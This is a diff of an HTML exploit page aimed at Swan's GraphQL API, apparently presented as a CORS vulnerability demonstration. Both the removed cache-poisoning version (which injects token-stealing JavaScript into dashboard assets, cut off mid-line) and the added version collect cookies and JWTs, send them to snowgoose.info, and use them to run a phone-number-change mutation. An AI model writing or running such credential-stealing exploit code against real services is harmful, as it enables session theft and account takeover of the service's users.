@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Swan API Security Audit</title>
+    <title>Swan API Security Test</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; line-height: 1.6; }
+        body { font-family: system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         h1 { color: #c41e3a; }
         pre { background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }
         .log { border: 1px solid #ddd; padding: 10px; height: 200px; overflow: auto; margin: 10px 0; font-family: monospace; }
@@ -16,295 +16,285 @@
     </style>
 </head>
 <body>
-    <h1>Swan API Cache Poisoning Attack</h1>
+    <h1>Swan API JWT Exfiltration</h1>
     
     <div class="note">
-        <p><strong>Important:</strong> This exploit uses browser cache poisoning to intercept and exfiltrate Swan authentication tokens. For proper execution:</p>
-        <ol>
-            <li>Click "Poison Browser Cache" below</li>
-            <li>Visit dashboard.swan.io in another tab and log in</li>
-            <li>Any authentication tokens will be automatically sent to snowgoose.info</li>
-        </ol>
+        <p><strong>Security Vulnerability Demo:</strong> This page demonstrates the CORS vulnerability in Swan's API by capturing authentication tokens and using them to execute GraphQL queries.</p>
     </div>
 
-    <h2>Cache Poisoning</h2>
-    <button onclick="poisonCache()">Poison Browser Cache</button>
-    <div id="cache-log" class="log"></div>
+    <button onclick="startExploit()">Start Exploit</button>
+    <div id="log" class="log"></div>
 
     <script>
         // Configuration
         const EXFIL_ENDPOINT = 'https://snowgoose.info/swan-capture';
-        const CACHE_NAME = 'swan-api-cache-v1';
-        
-        // Endpoints to target for cache poisoning
-        const targetEndpoints = [
+        const SWAN_ENDPOINTS = [
             'https://api.swan.io/admin-auth/graphql',
-            'https://api.swan.io/admin/graphql',
-            'https://api.swan.io/live-partner/graphql',
-            'https://api.swan.io/live-unauthenticated/graphql',
-            'https://dashboard.swan.io/assets/2.18.2/index-CdqNbDv_.js',
-            'https://identity.swan.io/assets/2.18.2/index-BvfhDkUZ.js'
+            'https://api.swan.io/admin/graphql'
         ];
-
+        
         // Logging function
-        function log(id, message, type = 'info') {
-            const container = document.getElementById(id);
+        function log(message, type = 'info') {
+            const container = document.getElementById('log');
             const timestamp = new Date().toLocaleTimeString();
             const className = type === 'error' ? 'error' : type === 'success' ? 'success' : '';
             container.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
             container.scrollTop = container.scrollHeight;
         }
-
-        // Cache poisoning main function
-        async function poisonCache() {
-            const logId = 'cache-log';
-            document.getElementById(logId).innerHTML = '';
-            log(logId, 'Starting cache poisoning attack...');
+        
+        // Extract all cookies and send them to exfiltration server
+        function exfiltrateData(data) {
+            // Send data via fetch
+            fetch(EXFIL_ENDPOINT, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data),
+                mode: 'no-cors'
+            }).catch(e => {
+                log(`Fetch exfiltration failed: ${e.message}`, 'error');
+                
+                // Fallback to image-based exfiltration
+                try {
+                    const img = new Image();
+                    img.src = `${EXFIL_ENDPOINT}/img?data=${encodeURIComponent(JSON.stringify(data))}`;
+                    document.body.appendChild(img);
+                    log('Using image fallback for exfiltration', 'info');
+                } catch(e2) {
+                    log(`Image exfiltration failed: ${e2.message}`, 'error');
+                }
+            });
+        }
+        
+        // Test a GraphQL mutation to showcase high impact
+        async function testGraphQLMutation(endpoint, token) {
+            try {
+                log(`Testing GraphQL mutation at ${endpoint}`, 'info');
+                
+                // Generate random phone number for testing
+                const randomNum = Math.floor(Math.random() * 90000000) + 10000000;
+                const newPhone = `+336${randomNum}`;
+                
+                // Prepare headers based on authentication type
+                let headers = {
+                    'Content-Type': 'application/json'
+                };
+                
+                // If we have a token, use it as a bearer token
+                if (token) {
+                    if (token.startsWith('Bearer ') || token.startsWith('bearer ')) {
+                        headers['Authorization'] = token;
+                    } else {
+                        headers['Authorization'] = `Bearer ${token}`;
+                    }
+                }
+                
+                // Include credentials to send any cookies
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: headers,
+                    body: JSON.stringify({
+                        query: `mutation {
+                            startPhoneNumberModification(input:{
+                                oldPhoneNumber:"+33600000001",
+                                newPhoneNumber:"${newPhone}"
+                            }) {
+                                __typename
+                                ... on StartPhoneNumberModificationSuccessPayload {
+                                    phoneNumberModification { id }
+                                }
+                                ... on PhoneNumberModificationAlreadyExistsRejection { message }
+                                ... on TooManyPhoneNumberModificationRejection { message }
+                            }
+                        }`
+                    })
+                });
+                
+                // Check response
+                const data = await response.json();
+                log(`GraphQL mutation response: ${JSON.stringify(data)}`, 'info');
+                
+                // Determine if the mutation was successful
+                if (data.data?.startPhoneNumberModification) {
+                    const typeName = data.data.startPhoneNumberModification.__typename;
+                    if (typeName === 'StartPhoneNumberModificationSuccessPayload') {
+                        log(`🚨 CRITICAL IMPACT! Successfully modified phone number to ${newPhone}`, 'success');
+                        
+                        // Exfiltrate the successful result
+                        exfiltrateData({
+                            event: 'successful_graphql_mutation',
+                            mutation: 'startPhoneNumberModification',
+                            result: data,
+                            endpoint: endpoint,
+                            token: token ? '****' : null  // Don't include the actual token in logs
+                        });
+                        
+                        return true;
+                    } else if (typeName.includes('Rejection')) {
+                        log(`Mutation processed but rejected: ${typeName}`, 'info');
+                        return false;
+                    }
+                } else if (data.errors) {
+                    const errorMsg = data.errors[0]?.message || 'Unknown error';
+                    log(`GraphQL error: ${errorMsg}`, 'error');
+                    
+                    // Check if it's an authentication error
+                    if (errorMsg.includes('Unauthenticated') || errorMsg.includes('Forbidden')) {
+                        log('Authentication required for this endpoint', 'error');
+                    }
+                    
+                    return false;
+                }
+                
+                return false;
+            } catch (error) {
+                log(`Error testing GraphQL: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Extract JWT from swan_session_id cookie
+        function extractJWTFromCookie(cookieString) {
+            try {
+                const cookies = cookieString.split(';');
+                for (const cookie of cookies) {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name === 'swan_session_id') {
+                        // Try to decode the cookie value (it might be URL encoded)
+                        let decodedValue;
+                        try {
+                            decodedValue = decodeURIComponent(value);
+                        } catch (e) {
+                            decodedValue = value;
+                        }
+                        
+                        // Check if it looks like a JWT (base64 segments separated by dots)
+                        if (decodedValue.match(/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/)) {
+                            log('Found JWT-like token in swan_session_id cookie', 'success');
+                            return decodedValue;
+                        } else {
+                            log('swan_session_id cookie found but does not appear to be a JWT', 'info');
+                            return decodedValue;  // Return it anyway, might be usable
+                        }
+                    }
+                }
+            } catch (e) {
+                log(`Error extracting JWT: ${e.message}`, 'error');
+            }
+            return null;
+        }
+        
+        // Search for JWTs in localStorage and sessionStorage
+        function searchStorageForJWT() {
+            const jwtPattern = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/;
+            const tokens = [];
             
             try {
-                // Open or create our cache
-                const cache = await caches.open(CACHE_NAME);
-                log(logId, `Cache '${CACHE_NAME}' opened successfully`);
+                // Check localStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    if (jwtPattern.test(value)) {
+                        tokens.push({ source: 'localStorage', key, value });
+                    }
+                }
                 
-                // Count of successfully poisoned endpoints
-                let poisonedCount = 0;
+                // Check sessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    if (jwtPattern.test(value)) {
+                        tokens.push({ source: 'sessionStorage', key, value });
+                    }
+                }
+            } catch (e) {
+                log(`Error searching storage: ${e.message}`, 'error');
+            }
+            
+            return tokens;
+        }
+        
+        // Main exploit function
+        async function startExploit() {
+            log('Starting Swan API exploitation...', 'info');
+            
+            // Step 1: Collect all cookies
+            const cookies = document.cookie;
+            log(`Found ${cookies.split(';').length} cookies`, 'info');
+            
+            // Step 2: Extract swan_session_id
+            const tokenFromCookie = extractJWTFromCookie(cookies);
+            if (tokenFromCookie) {
+                log('Extracted potential token from cookies', 'success');
+            } else {
+                log('No Swan session token found in cookies', 'info');
+            }
+            
+            // Step 3: Search for JWTs in storage
+            const storageTokens = searchStorageForJWT();
+            if (storageTokens.length > 0) {
+                log(`Found ${storageTokens.length} potential JWT tokens in storage`, 'success');
+            }
+            
+            // Step 4: Exfiltrate all collected data
+            const exfilData = {
+                cookies,
+                tokenFromCookie,
+                storageTokens,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+            
+            log('Exfiltrating collected data to snowgoose.info...', 'info');
+            exfiltrateData(exfilData);
+            
+            // Step 5: Test GraphQL endpoints using CORS vulnerability
+            log('Testing GraphQL endpoints with CORS vulnerability...', 'info');
+            
+            let mutationSuccess = false;
+            
+            // Try each endpoint with credentials (cookies)
+            for (const endpoint of SWAN_ENDPOINTS) {
+                log(`Testing endpoint ${endpoint} with cookies...`, 'info');
+                mutationSuccess = await testGraphQLMutation(endpoint);
                 
-                // Process each target endpoint
-                for (const endpoint of targetEndpoints) {
-                    try {
-                        // For GraphQL endpoints, create a special response that redirects auth tokens
-                        if (endpoint.includes('graphql')) {
-                            // Create interceptor response
-                            const poisonedResponse = new Response(
-                                `{"data":{"__interceptor":true},"intercept":true}`,
-                                {
-                                    headers: {
-                                        'Content-Type': 'application/json',
-                                        'X-Poisoned-Cache': 'true'
-                                    }
-                                }
-                            );
-                            
-                            // Poison OPTIONS preflight response which happens before POST
-                            const optionsRequest = new Request(endpoint, { method: 'OPTIONS' });
-                            await cache.put(optionsRequest, poisonedResponse);
-                            
-                            // Also poison GET requests to the same endpoint
-                            const getRequest = new Request(endpoint);
-                            await cache.put(getRequest, poisonedResponse);
-                            
-                            poisonedCount++;
-                            log(logId, `✅ Poisoned cache for ${endpoint}`, 'success');
-                        } 
-                        // For JS files, inject our exfiltration code
-                        else if (endpoint.includes('.js')) {
-                            try {
-                                // Fetch the original JS file
-                                const originalResponse = await fetch(endpoint, { 
-                                    cache: 'no-store',
-                                    credentials: 'omit'  // Don't send credentials for this fetch
-                                });
-                                
-                                if (!originalResponse.ok) {
-                                    throw new Error(`Failed to fetch JS: ${originalResponse.status}`);
-                                }
-                                
-                                const originalJS = await originalResponse.text();
-                                
-                                // Create modified JS with exfiltration code
-                                const poisonedJS = `
-                                    // Exfiltration code for Swan.io
-                                    (function() {
-                                        // Record that we've loaded this poisoned file
-                                        console.log('Poisoned JS file loaded - targeting Swan.io auth');
-                                        
-                                        // Immediately exfiltrate any existing cookies
-                                        try {
-                                            const img = new Image();
-                                            img.src = '${EXFIL_ENDPOINT}/img?data=' + encodeURIComponent(document.cookie);
-                                            document.body.appendChild(img);
-                                        } catch(e) { console.error('Initial exfil error:', e); }
-                                        
-                                        // Override fetch to capture auth tokens
-                                        const originalFetch = window.fetch;
-                                        window.fetch = function(resource, init) {
-                                            try {
-                                                // Only intercept requests to Swan API
-                                                if (typeof resource === 'string' && resource.includes('swan.io')) {
-                                                    console.log('Intercepting fetch to:', resource);
-                                                    
-                                                    // Clone the init object to avoid modifying the original
-                                                    const initClone = init ? {...init} : {};
-                                                    
-                                                    // Capture any authorization headers
-                                                    let authHeader = null;
-                                                    let headers = {};
-                                                    
-                                                    if (initClone.headers) {
-                                                        // Extract headers regardless of format
-                                                        if (initClone.headers instanceof Headers) {
-                                                            initClone.headers.forEach((value, key) => {
-                                                                headers[key] = value;
-                                                            });
-                                                        } else if (typeof initClone.headers === 'object') {
-                                                            headers = {...initClone.headers};
-                                                        }
-                                                        
-                                                        // Look for auth headers
-                                                        for (const key in headers) {
-                                                            if (key.toLowerCase() === 'authorization' || 
-                                                                key.toLowerCase().includes('token') ||
-                                                                key.toLowerCase().includes('swan')) {
-                                                                authHeader = {key, value: headers[key]};
-                                                            }
-                                                        }
-                                                    }
-                                                    
-                                                    // Try to extract body content if present
-                                                    let bodyContent = null;
-                                                    if (initClone.body) {
-                                                        try {
-                                                            if (typeof initClone.body === 'string') {
-                                                                bodyContent = initClone.body;
-                                                                // Look for tokens in JSON body
-                                                                try {
-                                                                    const bodyJson = JSON.parse(bodyContent);
-                                                                    if (bodyJson.variables && bodyJson.variables.token) {
-                                                                        authHeader = {
-                                                                            key: 'body-token', 
-                                                                            value: bodyJson.variables.token
-                                                                        };
-                                                                    }
-                                                                } catch(e) {}
-                                                            } else if (initClone.body instanceof FormData) {
-                                                                bodyContent = "FormData (not serializable)";
-                                                            } else if (initClone.body instanceof Blob) {
-                                                                bodyContent = "Blob (not serializable)";
-                                                            }
-                                                        } catch(e) {
-                                                            bodyContent = "Error extracting body: " + e.message;
-                                                        }
-                                                    }
-                                                    
-                                                    // Build exfil data package
-                                                    const exfilData = {
-                                                        timestamp: new Date().toISOString(),
-                                                        url: resource,
-                                                        method: initClone.method || 'GET',
-                                                        auth: authHeader,
-                                                        headers: headers,
-                                                        body: bodyContent,
-                                                        cookies: document.cookie
-                                                    };
-                                                    
-                                                    // Send exfil data via fetch
-                                                    fetch('${EXFIL_ENDPOINT}', {
-                                                        method: 'POST',
-                                                        headers: {'Content-Type': 'application/json'},
-                                                        body: JSON.stringify(exfilData),
-                                                        // Use no-cors mode as fallback if needed
-                                                        mode: 'no-cors'
-                                                    }).catch(e => {
-                                                        console.error('Exfil error, trying backup method:', e);
-                                                        
-                                                        // Backup method: Image-based exfiltration
-                                                        const img = new Image();
-                                                        img.src = '${EXFIL_ENDPOINT}/img?data=' + 
-                                                            encodeURIComponent(JSON.stringify({
-                                                                url: resource,
-                                                                auth: authHeader,
-                                                                cookies: document.cookie
-                                                            }));
-                                                        document.body.appendChild(img);
-                                                    });
-                                                }
-                                            } catch(e) {
-                                                console.error('Error in fetch interception:', e);
-                                            }
-                                            
-                                            // Call the original fetch
-                                            return originalFetch.apply(this, arguments);
-                                        };
-                                        
-                                        // Also intercept XMLHttpRequest to capture tokens
-                                        const originalXHROpen = XMLHttpRequest.prototype.open;
-                                        const originalXHRSend = XMLHttpRequest.prototype.send;
-                                        const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
-                                        
-                                        // Track request data for each XHR instance
-                                        XMLHttpRequest.prototype.open = function(method, url, ...args) {
-                                            this._interceptionUrl = url;
-                                            this._interceptionMethod = method;
-                                            this._interceptionHeaders = {};
-                                            return originalXHROpen.apply(this, [method, url, ...args]);
-                                        };
-                                        
-                                        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
-                                            this._interceptionHeaders[header] = value;
-                                            return originalXHRSetRequestHeader.apply(this, [header, value]);
-                                        };
-                                        
-                                        XMLHttpRequest.prototype.send = function(body) {
-                                            try {
-                                                // Only intercept requests to Swan API
-                                                if (this._interceptionUrl && 
-                                                    typeof this._interceptionUrl === 'string' && 
-                                                    this._interceptionUrl.includes('swan.io')) {
-                                                    
-                                                    console.log('Intercepting XHR to:', this._interceptionUrl);
-                                                    
-                                                    // Find auth headers
-                                                    let authHeader = null;
-                                                    for (const key in this._interceptionHeaders) {
-                                                        if (key.toLowerCase() === 'authorization' || 
-                                                            key.toLowerCase().includes('token') ||
-                                                            key.toLowerCase().includes('swan')) {
-                                                            authHeader = {key, value: this._interceptionHeaders[key]};
-                                                        }
-                                                    }
-                                                    
-                                                    // Try to parse body content if it's a string
-                                                    let bodyContent = body;
-                                                    if (typeof body === 'string') {
-                                                        try {
-                                                            const bodyJson = JSON.parse(body);
-                                                            // Look for tokens in body
-                                                            if (bodyJson.variables && bodyJson.variables.token) {
-                                                                authHeader = {
-                                                                    key: 'body-token', 
-                                                                    value: bodyJson.variables.token
-                                                                };
-                                                            }
-                                                        } catch(e) {}
-                                                    }
-                                                    
-                                                    // Build exfil data package
-                                                    const exfilData = {
-                                                        timestamp: new Date().toISOString(),
-                                                        url: this._interceptionUrl,
-                                                        method: this._interceptionMethod,
-                                                        auth: authHeader,
-                                                        headers: this._interceptionHeaders,
-                                                        body: bodyContent,
-                                                        cookies: document.cookie
-                                                    };
-                                                    
-                                                    // Send exfil data
-                                                    const exfilXhr = new XMLHttpRequest();
-                                                    exfilXhr.open('POST', '${EXFIL_ENDPOINT}', true);
-                                                    exfilXhr.setRequestHeader('Content-Type', 'application/json');
-                                                    exfilXhr.send(JSON.stringify(exfilData));
-                                                }
-                                            } catch(e) {
-                                                console.error('Error in XHR interception:', e);
-                                            }
-                                            
-                                            // Call the original send
-                                            return originalXHRSend.apply(this, [body]);
-                                        };
-                                        
-                                        // Scan for JWT tokens in the DOM every 3 seconds
-                                        setInterval(function() {
-                                            try {
-                                                // JWT pattern
-                                                const jwt_regex = /eyJ[a-zA-Z
+                if (mutationSuccess) {
+                    log(`Successful exploitation via CORS with cookies at ${endpoint}`, 'success');
+                    break;
+                }
+                
+                // If we have a token from cookie, try with that
+                if (tokenFromCookie) {
+                    log(`Testing with extracted token at ${endpoint}...`, 'info');
+                    mutationSuccess = await testGraphQLMutation(endpoint, tokenFromCookie);
+                    
+                    if (mutationSuccess) {
+                        log(`Successful exploitation with extracted token at ${endpoint}`, 'success');
+                        break;
+                    }
+                }
+                
+                // Try any tokens found in storage
+                for (const tokenObj of storageTokens) {
+                    log(`Testing with ${tokenObj.source} token at ${endpoint}...`, 'info');
+                    mutationSuccess = await testGraphQLMutation(endpoint, tokenObj.value);
+                    
+                    if (mutationSuccess) {
+                        log(`Successful exploitation with ${tokenObj.source} token at ${endpoint}`, 'success');
+                        break;
+                    }
+                }
+            }
+            
+            // Final result
+            if (mutationSuccess) {
+                log('🚨 CORS VULNERABILITY CONFIRMED WITH HIGH IMPACT! Successfully executed GraphQL mutation using credentials.', 'success');
+            } else {
+                log('Could not successfully execute GraphQL mutations. Try visiting dashboard.swan.io first to get valid cookies.', 'error');
+            }
+        }
+    </script>
+</body>
+</html>
